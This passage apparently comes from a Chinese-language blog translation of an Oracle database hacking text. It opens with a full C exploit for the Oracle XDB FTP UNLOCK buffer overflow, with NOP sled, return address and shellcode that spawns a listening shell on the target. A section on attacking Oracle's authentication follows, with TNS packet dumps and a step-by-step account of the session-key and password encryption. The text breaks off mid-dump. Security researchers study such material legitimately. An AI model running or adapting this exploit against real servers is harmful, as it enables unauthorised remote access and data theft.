class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line">#include &lt;netdb.h&gt;</span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">      struct hostent *he;</span><br><span class="line">      struct sockaddr_in sa;</span><br><span class="line">      int sock;</span><br><span class="line">      unsigned int addr = 0;</span><br><span class="line">      char recvbuffer[512]=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">      char user[260]=&quot;user &quot;;</span><br><span class="line">      char passwd[260]=&quot;pass &quot;;</span><br><span class="line">      int rcv=0;</span><br><span class="line">      int snd =0;</span><br><span class="line">      int count = 0;</span><br><span class="line">      unsigned char nop_sled[1804]=&quot;&quot;;</span><br><span class="line">      unsigned char saved_return_address[]=&quot;\x41\xc8\xff\xbf&quot;;</span><br><span class="line">      unsigned char exploit[2100]=&quot; unlock / AAAABBB&quot;</span><br><span class="line">      &quot;BCCCCDDDDEEEEFFF&quot;</span><br><span class="line">      &quot;FGGGGHHHHIIIIJJJ&quot;</span><br><span class="line">      &quot;JKKKKLLLLMMMMNNN&quot;</span><br><span class="line">      &quot;NOOOOPPPPQQQQRRR&quot;</span><br><span class="line">      &quot;RSSSSTTTTUUUUVVV&quot;</span><br><span class="line">      &quot;VWWWWXXXXYYYYZZZ&quot;</span><br><span class="line">      &quot;Zaaaabbbbccccdd&quot;;</span><br><span class="line"></span><br><span class="line">      unsigned char</span><br><span class="line">code[]=&quot;\x31\xdb\x53\x43\x53\x43\x53\x4b\x6a\x66\x58\x54\x59\xcd&quot;</span><br><span class="line">      &quot;\x80\x50\x4b\x53\x53\x53\x66\x68\x41\x41\x43\x43\x66\x53&quot;</span><br><span class="line">      &quot;\x54\x59\x6a\x10\x51\x50\x54\x59\x6a\x66\x58\xcd\x80\x58&quot;</span><br><span class="line">      &quot;\x6a\x05\x50\x54\x59\x6a\x66\x58\x43\x43\xcd\x80\x58\x83&quot;</span><br><span class="line">      &quot;\xec\x10\x54\x5a\x54\x52\x50\x54\x59\x6a\x66\x58\x43\xcd&quot;</span><br><span class="line">      &quot;\x80\x50\x31\xc9\x5b\x6a\x3f\x58\xcd\x80\x41\x6a\x3f\x58&quot;</span><br><span class="line">      &quot;\xcd\x80\x41\x6a\x3f\x58\xcd\x80\x6a\x0b\x58\x99\x52\x68&quot;</span><br><span class="line">      &quot;\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x54\x5b\x52\x53\x54&quot;</span><br><span class="line">      &quot;\x59\xcd\x80\r\n&quot;;</span><br><span class="line">      if(argc !=4)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;\n\n\tOracle XDB FTP Service UNLOCK Buffer Overflow</span><br><span class="line">Exploit&quot;);</span><br><span class="line">            printf(&quot;\n\t\tfor Blackhat (http://www.blackhat.com)&quot;);</span><br><span class="line">            printf(&quot;\n\n\tSpawns a shell listening on TCP Port 16705&quot;);</span><br><span class="line">            printf(&quot;\n\n\tUsage:\t%s host userid password&quot;,argv[0]);</span><br><span class="line">            printf(&quot;\n\n\tDavid Litchfield\n\t(david@ngssoftware.com)&quot;);</span><br><span class="line">            printf(&quot;\n\t7th July 2003\n\n\n&quot;);</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line">      while(count &lt; 1800)</span><br><span class="line">            nop_sled[count++]=0x90;</span><br><span class="line"></span><br><span class="line">      // Build the exploit</span><br><span class="line">      strcat(exploit,saved_return_address);</span><br><span class="line">      strcat(exploit,nop_sled);</span><br><span class="line">      strcat(exploit,code);</span><br><span class="line"></span><br><span class="line">      // Process arguments</span><br><span class="line">      strncat(user,argv[2],240);</span><br><span class="line">      strncat(passwd,argv[3],240);</span><br><span class="line">      strcat(user,&quot;\r\n&quot;);</span><br><span class="line">      strcat(passwd,&quot;\r\n&quot;);</span><br><span class="line"></span><br><span class="line">      // Setup socket stuff</span><br><span class="line">      sa.sin_addr.s_addr=INADDR_ANY;</span><br><span class="line">      sa.sin_family = AF_INET;</span><br><span class="line">      sa.sin_port = htons((unsigned short) 2100);</span><br><span class="line"></span><br><span class="line">      // Resolve the target system</span><br><span class="line">      if(isalpha(argv[1][0])==0)</span><br><span class="line">      &#123;</span><br><span class="line">            addr = inet_addr(argv[1]);</span><br><span class="line">            memcpy(&amp;sa.sin_addr,&amp;addr,4);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">            he = gethostbyname(argv[1]);</span><br><span class="line">            if(he == NULL)</span><br><span class="line">                  return printf(&quot;Couldn&#x27;t resolve host %s\n&quot;,argv[1]);</span><br><span class="line">            memcpy(&amp;sa.sin_addr,he-&gt;h_addr,he-&gt;h_length);</span><br><span class="line">      &#125;</span><br><span class="line">      sock = socket(AF_INET,SOCK_STREAM,0);</span><br><span class="line">      if(sock &lt; 0)</span><br><span class="line">            return printf(&quot;socket() failed.\n&quot;);</span><br><span class="line">      if(connect(sock,(struct sockaddr *) &amp;sa,sizeof(sa)) &lt; 0)</span><br><span class="line">      &#123;</span><br><span class="line">            close(sock);</span><br><span class="line">                  return printf(&quot;connect() failed.\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      printf(&quot;\nConnected to %s....\n&quot;,argv[1]);</span><br><span class="line"></span><br><span class="line">      // Receive and print banner</span><br><span class="line">      rcv = recv(sock,recvbuffer,508,0);</span><br><span class="line">      if(rcv &gt; 0)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;%s\n&quot;,recvbuffer);</span><br><span class="line">            bzero(recvbuffer,rcv+1);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">            close(sock);</span><br><span class="line">            return printf(&quot;Problem with recv()\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // send user command</span><br><span class="line">      snd = send(sock,user,strlen(user),0);</span><br><span class="line">      if(snd != strlen(user))</span><br><span class="line">      &#123;</span><br><span class="line">            close(sock);</span><br><span class="line">            return printf(&quot;Problem with send()....\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">            printf(&quot;%s&quot;,user);</span><br><span class="line">      &#125;</span><br><span class="line">      // Receive response. Response code should be 331</span><br><span class="line">      rcv = recv(sock,recvbuffer,508,0);</span><br><span class="line">      if(rcv &gt; 0)</span><br><span class="line">      &#123;</span><br><span class="line">            if(recvbuffer[0]==0x33 &amp;&amp; recvbuffer[1]==0x33 &amp;&amp;</span><br><span class="line">recvbuffer[2]==0x31)</span><br><span class="line">            &#123;</span><br><span class="line">                  printf(&quot;%s\n&quot;,recvbuffer);</span><br><span class="line">                  bzero(recvbuffer,rcv+1);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                  close(sock);</span><br><span class="line">                  return printf(&quot;FTP response code was not 331.\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">            close(sock);</span><br><span class="line">            return printf(&quot;Problem with recv()\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // Send pass command</span><br><span class="line">      snd = send(sock,passwd,strlen(passwd),0);</span><br><span class="line">      if(snd != strlen(user))</span><br><span class="line">      &#123;</span><br><span class="line">            close(sock);</span><br><span class="line">            return printf(&quot;Problem with send()....\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">            printf(&quot;%s&quot;,passwd);</span><br><span class="line"></span><br><span class="line">      // Receive reponse. If not 230 login has failed.</span><br><span class="line">      rcv = recv(sock,recvbuffer,508,0);</span><br><span class="line">      if(rcv &gt; 0)</span><br><span class="line">      &#123;</span><br><span class="line">            if(recvbuffer[0]==0x32 &amp;&amp; recvbuffer[1]==0x33 &amp;&amp;</span><br><span class="line">recvbuffer[2]==0x30)</span><br><span class="line">            &#123;</span><br><span class="line">                  printf(&quot;%s\n&quot;,recvbuffer);</span><br><span class="line">                  bzero(recvbuffer,rcv+1);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                  close(sock);</span><br><span class="line">                  return printf(&quot;FTP response code was not 230. Login</span><br><span class="line">failed...\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">     else</span><br><span class="line">     &#123;</span><br><span class="line">          close(sock);</span><br><span class="line">          return printf(&quot;Problem with recv()\n&quot;);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     // Send the UNLOCK command with exploit</span><br><span class="line">     snd = send(sock,exploit,strlen(exploit),0);</span><br><span class="line">     if(snd != strlen(exploit))</span><br><span class="line">     &#123;</span><br><span class="line">          close(sock);</span><br><span class="line">          return printf(&quot;Problem with send()....\n&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">     // Should receive a 550 error response.</span><br><span class="line">     rcv = recv(sock,recvbuffer,508,0);</span><br><span class="line">     if(rcv &gt; 0)</span><br><span class="line">     printf(&quot;%s\n&quot;,recvbuffer);</span><br><span class="line">     printf(&quot;\n\nExploit code sent....\n\nNow telnet to %s</span><br><span class="line">16705\n\n&quot;,argv[1]);</span><br><span class="line">     close(sock);</span><br><span class="line">     return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="攻击身份验证过程"><a href="#攻击身份验证过程" class="headerlink" title="攻击身份验证过程"></a>攻击身份验证过程</h2><p>​        获得对数据库及其数据的完全访问权限是大多数攻击者的最终选择，但仅获得任何访问权限就是第一步。 对于尚未拥有用户ID或密码的用户，必须首先绕过身份验证过程。 这样做既可以像利用缓冲区溢出一样技术，也可以像进行蛮力攻击一样简单，也可以简单地获取用户ID和密码。 本章涉及通过攻击身份验证过程来访问数据库服务器本身。</p><h3 id="如何进行身份验证"><a href="#如何进行身份验证" class="headerlink" title="如何进行身份验证"></a>如何进行身份验证</h3><p>​        尝试登录数据库时，客户端首先连接到TNS侦听器并请求访问数据库服务。 以下代码显示了示例连接的数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 320</span><br><span class="line">      Identifier: 9373</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line"></span><br><span class="line">      Checksum: 0x532d</span><br><span class="line">      Source IP: 192.168.0.120</span><br><span class="line">      Dest IP: 192.168.0.37</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 1916</span><br><span class="line">      Dest port: 1521</span><br><span class="line">      Sequence: 2802498112</span><br><span class="line">      ack: 2168229595</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH)</span><br><span class="line">      Window Size: 17520</span><br><span class="line">      Checksum: 0x4915</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      01 18 00 00 01 00 00 00 01 39 01 2c 00 00 08 00           9 ,</span><br><span class="line">      7f ff c6 0e 00 00 01 00 00 de 00 3a 00 00 02 00             :</span><br><span class="line">      61 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00  aa</span><br><span class="line">      00 00 00 00 00 00 00 00 00 00 28 44 45 53 43 52            (DESCR</span><br><span class="line">      49 50 54 49 4f 4e 3d 28 41 44 44 52 45 53 53 3d  IPTION=(ADDRESS=</span><br><span class="line">      28 50 52 4f 54 4f 43 4f 4c 3d 54 43 50 29 28 48  (PROTOCOL=TCP)(H</span><br><span class="line">      4f 53 54 3d 31 39 32 2e 31 36 38 2e 30 2e 33 37  OST=192.168.0.37</span><br><span class="line">      29 28 50 4f 52 54 3d 31 35 32 31 29 29 28 43 4f  )(PORT=1521))(CO</span><br><span class="line">      4e 4e 45 43 54 5f 44 41 54 41 3d 28 53 45 52 56  NNECT_DATA=(SERV</span><br><span class="line">      45 52 3d 44 45 44 49 43 41 54 45 44 29 28 53 45  ER=DEDICATED)(SE</span><br><span class="line">      52 56 49 43 45 5f 4e 41 4d 45 3d 6f 72 61 38 31  RVICE_NAME=ora81</span><br><span class="line">      37 2e 6e 67 73 73 6f 66 74 77 61 72 65 2e 63 6f  7.ngssoftware.co</span><br><span class="line">      6d 29 28 43 49 44 3d 28 50 52 4f 47 52 41 4d 3d  m)(CID=(PROGRAM=</span><br><span class="line">      43 3a 5c 6f 72 61 63 6c 65 5c 70 72 6f 64 75 63  C:\oracle\produc</span><br><span class="line">      74 5c 31 30 2e 32 2e 30 5c 64 62 5f 31 5c 62 69  t\10.2.0\db_1\bi</span><br><span class="line">      6e 5c 73 71 6c 70 6c 75 73 2e 65 78 65 29 28 48  n\sqlplus.exe)(H</span><br><span class="line">      4f 53 54 3d 4f 52 41 29 28 55 53 45 52 3d 6f 72  OST=ORA)(USER=or</span><br><span class="line">      61 63 6c 65 29 29 29 29                          acle)))))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        请注意SERVICE_NAME条目= ora817.ngssoftware.com。 如果此服务尚未在TNS侦听器中注册，则该侦听器将生成一个错误。 如果该服务已注册，则侦听器将重定向客户端以连接到另一个TCP端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 104</span><br><span class="line">      Identifier: 32335</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0xfa52</span><br><span class="line">      Source IP: 192.168.0.37</span><br><span class="line">      Dest IP: 192.168.0.120</span><br><span class="line"></span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 1521</span><br><span class="line">      Dest port: 1916</span><br><span class="line">      Sequence: 2168229595</span><br><span class="line">      ack: 2802498392</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH )</span><br><span class="line">      Window Size: 65255</span><br><span class="line">      Checksum: 0xe663</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      00 40 00 00 05 00 00 00 00 36 28 41 44 44 52 45   @       6(ADDRE</span><br><span class="line">      53 53 3d 28 50 52 4f 54 4f 43 4f 4c 3d 74 63 70  SS=(PROTOCOL=tcp</span><br><span class="line">      29 28 48 4f 53 54 3d 31 39 32 2e 31 36 38 2e 30  )(HOST=192.168.0</span><br><span class="line">      2e 33 37 29 28 50 4f 52 54 3d 33 35 39 30 29 29  .37)(PORT=3590))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        在这种情况下，客户端将重定向到TCP端口3590。如果服务器以MTS（多线程服务器）模式运行，则客户端将不会重定向，并且所有通信都将通过侦听器端口进行-在这种情况下为1521。 客户端连接到新端口后，它将发出与连接到侦听器时相同的服务请求。</p><p>​        在客户端的序言连接到侦听器等之后，身份验证过程就开始了。 客户端通过向服务器发送其用户名来实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 236</span><br><span class="line">      Identifier: 59545</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0x8f84</span><br><span class="line">      Source IP: 192.168.0.37</span><br><span class="line">      Dest IP: 192.168.0.120</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 2500</span><br><span class="line">      Dest port: 1521</span><br><span class="line">      Sequence: 668563957</span><br><span class="line">      ack: 2568057659</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH )</span><br><span class="line">      Window Size: 32780</span><br><span class="line">      Checksum: 0x65e8</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line"></span><br><span class="line">Raw Data</span><br><span class="line">      00 c4 00 00 06 00 00 00 00 00 03 76 02 b0 5f df             v _</span><br><span class="line">      00 06 00 00 00 01 00 00 00 58 cc 12 00 04 00 00           X</span><br><span class="line">      00 28 ca 12 00 14 ce 12 00 06 73 79 73 74 65 6d   (        system</span><br><span class="line">      0d 00 00 00 0d 41 55 54 48 5f 54 45 52 4d 49 4e       AUTH_TERMIN</span><br><span class="line">      41 4c 07 00 00 00 07 47 4c 41 44 49 55 53 00 00  AL     GLADIUS</span><br><span class="line">      00 00 0f 00 00 00 0f 41 55 54 48 5f 50 52 4f 47         AUTH_PROG</span><br><span class="line">      52 41 4d 5f 4e 4d 0b 00 00 00 0b 53 51 4c 50 4c  RAM_NM     SQLPL</span><br><span class="line">      55 53 2e 45 58 45 00 00 00 00 0c 00 00 00 0c 41  US.EXE         A</span><br><span class="line">      55 54 48 5f 4d 41 43 48 49 4e 45 11 00 00 00 11  UTH_MACHINE</span><br><span class="line">      57 4f 52 4b 47 52 4f 55 50 5c 47 4c 41 44 49 55  WORKGROUP\GLADIU</span><br><span class="line">      53 00 00 00 00 08 00 00 00 08 41 55 54 48 5f 50  S         AUTH_P</span><br><span class="line">      49 44 09 00 00 00 09 35 35 37 36 3a 35 34 35 36  ID     5576:5456</span><br><span class="line">      00 00 00 00</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        在前面的数据包转储中，用户名是system。服务器使用此用户名并检查其是否为有效用户。如果不是，则服务器向客户端发送“拒绝登录”错误。如果用户名确实存在，则服务器从数据库中提取用户的密码哈希。服务器使用此哈希值创建一个秘密号码。</p><p>​        密码创建如下：服务器调用orageneric库中的slgdt（）函数。此函数实质上检索系统时间。分钟，小时，毫秒和秒都以WORD的形式存储在一起，以形成要加密的“文本”的八个字节。加密中使用的密钥的前四个字节表示与用户的十六进制密码哈希值的后四个字节异或的分钟和小时；密钥的最后四个字节由毫秒和秒组成，与用户的十六进制密码哈希值的前四个字节进行异或。该密钥用于通过调用oracommon库中的kzsrenc（）函数来加密文本。此函数基本上使用lncgks（）函数执行DES密钥调度，然后使用lncecb（）函数在ECB模式下使用DES输出密文。</p><p>​        此处生成的密文成为密码。然后，再次使用kzsrenc（）函数，使用用户的密码哈希对该密文进行加密；结果就是AUTH_SESSKEY。然后将其发送给客户端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 185</span><br><span class="line">      Identifier: 52755</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0xaa3d</span><br><span class="line"></span><br><span class="line">      Source IP: 192.168.0.120</span><br><span class="line">      Dest IP: 192.168.0.37</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 1521</span><br><span class="line">      Dest port: 2500</span><br><span class="line">      Sequence: 2568057659</span><br><span class="line">      ack: 668564153</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH)</span><br><span class="line">      Window Size: 16275</span><br><span class="line">      Checksum: 0x4c2d</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      00 91 00 00 06 00 00 00 00 00 08 01 00 0c 00 00</span><br><span class="line">      00 0c 41 55 54 48 5f 53 45 53 53 4b 45 59 10 00   AUTH_SESSKEY</span><br><span class="line">      00 00 10 36 43 43 33 37 42 41 33 44 41 37 39 37    6CC37BA3DA797</span><br><span class="line">      35 44 36 00 00 00 00 04 01 00 00 00 00 00 00 00 5D6</span><br><span class="line">      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">      00 00 02 00 00 00 00 00 00 36 01 00 00 00 00 00          6</span><br><span class="line">      00 b8 00 8b 0a 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">      00</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        客户端收到AUTH_SESSKEY后，必须对其解密以检索密码。 用户使用oracore库中的lncupw（）函数创建自己的密码哈希的副本。 然后，通过调用kzsrdec（）函数，将此哈希用作解密AUTH_SESSKEY的密钥。 如果一切顺利，则应该生成密码。 然后，通过调用kzsrenp（）函数，将此秘密数字用作加密用户明文，区分大小写的密码的密钥。 该功能执行DES密钥调度，并以CBC模式加密用户密码。 密文然后作为AUTH_PASSWORD发送回服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 839</span><br><span class="line">      Identifier: 59546</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0x8d28</span><br><span class="line">      Source IP: 192.168.0.37</span><br><span class="line">      Dest IP: 192.168.0.120</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 2500</span><br><span class="line">      Dest port: 1521</span><br><span class="line"></span><br><span class="line">      Sequence: 668564153</span><br><span class="line">      ack: 2568057804</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH )</span><br><span class="line">      Window Size: 32762</span><br><span class="line">      Checksum: 0x0838</span><br><span class="line">      Urgent 